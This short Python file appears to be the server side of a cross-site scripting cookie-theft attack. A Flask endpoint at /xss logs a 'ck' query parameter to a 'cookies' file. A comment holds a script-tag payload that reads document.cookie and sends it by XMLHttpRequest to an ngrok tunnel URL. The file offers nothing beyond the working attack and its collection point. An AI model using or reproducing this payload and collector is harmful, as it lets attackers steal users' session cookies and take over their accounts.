#127.0.0.1:5000/xss?cookie=fdfdfd => request.args

from flask import Flask, request
app=Flask(__name__)
@app.route("/xss",methods=["GET"])
def xss():
    open("cookies","a").write(request.args["ck"])
    return "hello"
app.run("0.0.0.0")

# <script>var x= new XMLHttpRequest();x.open("GET","http://cba4c76a.ngrok.io/xss?ck="+document.cookie);x.send();</script>
